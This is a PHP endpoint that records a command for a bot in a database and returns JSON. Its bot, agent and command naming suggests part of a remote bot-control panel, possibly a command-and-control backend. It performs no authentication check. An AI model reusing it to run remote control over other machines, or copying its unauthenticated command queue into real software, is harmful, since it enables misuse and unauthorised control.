<?php
include "../../settings/settings.php";

function writeToLog($message) {
    error_log(date('Y-m-d H:i:s') . ": " . $message . "\n", 3, '../../logs/send_commands.log');
}

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve POST parameters
    $bot_id = $_POST['bot_id'] ?? null;
    $agent_name = $_POST['agent_name'] ?? null;
    $cmd_sent = $_POST['cmd_sent'] ?? null;
    $bot_name = $_POST['bot_name'] ?? null;

    // Log the received parameters
    writeToLog("Received parameters: bot_id=$bot_id, agent_name=$agent_name, cmd_sent=$cmd_sent");

    // Validate parameters
    if ($bot_id && $cmd_sent) {
        // Prepare the SQL statement to insert into the logs table
        $stmt_insert_log = $conn->prepare("INSERT INTO logs (agent, bot, content) VALUES (?, ?, ?)");
        $stmt_insert_log->bind_param("sss", $agent_name, $bot_name, $cmd_sent);

        // Execute the insert statement for the logs table
        if ($stmt_insert_log->execute()) {
            // Prepare the SQL statement to update cmd_sent for the specified bot_id
            $stmt_update = $conn->prepare("UPDATE bots SET cmd_sent = ? WHERE id = ?");
            $stmt_update->bind_param("si", $cmd_sent, $bot_id);

            // Execute the update statement
            if ($stmt_update->execute()) {
                $response = [
                    'status' => 'success',
                    'message' => 'Command sent updated successfully.'
                ];
            } else {
                $response = [
                    'status' => 'error',
                    'message' => 'Failed to update command sent.'
                ];
            }

            // Close the update statement
            $stmt_update->close();
        } else {
            $response = [
                'status' => 'error',
                'message' => 'Failed to insert into logs table.'
            ];
        }

        // Close the insert statement for the logs table
        $stmt_insert_log->close();
    } else {
        // Missing parameters
        $response = [
            'status' => 'error',
            'message' => 'Missing required parameters.'
        ];
    }
} else {
    // Handle non-POST requests
    $response = [
        'status' => 'error',
        'message' => 'Invalid request method. Please use POST.'
    ];
}

// Return the result as JSON
header('Content-Type: application/json');
echo json_encode($response);
?>
